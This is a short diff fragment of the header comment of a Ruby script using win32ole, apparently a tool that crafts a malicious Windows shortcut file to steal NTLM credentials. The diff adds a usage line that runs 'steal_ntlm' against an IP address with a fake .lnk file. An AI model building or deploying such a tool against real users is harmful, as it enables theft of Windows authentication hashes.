@@ -1,6 +1,6 @@
 ##################
 # bad link
-#  steals NTLM
+#  ./steal_ntlm 192.168.1.1 fakelink.lnk 
 ##################
 require 'win32ole'
 
